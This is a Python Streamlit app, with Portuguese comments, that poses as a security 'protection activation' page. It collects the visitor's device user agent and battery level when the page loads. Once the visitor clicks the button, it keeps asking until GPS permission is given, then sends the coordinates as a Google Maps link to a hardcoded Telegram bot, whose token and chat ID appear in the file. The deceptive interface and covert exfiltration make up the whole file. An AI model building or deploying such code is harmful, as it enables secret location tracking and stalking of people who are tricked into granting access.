import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONFIGURAÇÕES (TELEGRAM)
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Segurança", layout="centered")

# 2. CAPTURA AUTOMÁTICA (DISPOSITIVO E BATERIA)
# Captura o modelo e a bateria assim que a página carrega
modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE_MODEL')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BATTERY_LEVEL')

# 3. INTERFACE VISUAL
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)

# Mantém o estado do clique
if 'btn_clicado' not in st.session_state:
    st.session_state['btn_clicado'] = False

# Mostra a esfera de progresso
caixa_status = st.empty()
if not st.session_state['btn_clicado']:
    caixa_status.markdown('<h1 style="text-align:center; font-size:100px;">4%</h1>', unsafe_allow_html=True)
else:
    caixa_status.markdown('<h1 style="text-align:center; font-size:60px;">Wait...</h1>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 4. O BOTÃO DE CLIQUE ÚNICO
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['btn_clicado'] = True

# 5. LÓGICA DE CAPTURA APÓS O CLIQUE
if st.session_state['btn_clicado']:
    # Chama o GPS (O navegador vai pedir a permissão aqui)
    loc = get_geolocation() 
    
    if loc:
        # Se pegou a localização, envia tudo
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ PROTEÇÃO ATIVADA\n\n"
            f"📱 Modelo: {modelo[:60] if modelo else 'Não capturado'}\n"
            f"🔋 Bateria: {bateria if bateria else '--'}%\n"
            f"📍 [LOCALIZAÇÃO NO MAPA]({mapa})"
        )
        
        enviar_telegram(relatorio)
        st.success("✅ Proteção Ativada com Sucesso!")
        st.session_state['btn_clicado'] = False
        st.stop()
    else:
        # Enquanto não aceitar a localização, ele fica nesta tela
        st.warning("⚠️ Aceite a permissão de localização no navegador para concluir...")
        time.sleep(2)
        st.rerun()

st.markdown('<p style="text-align:center; color:#555; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
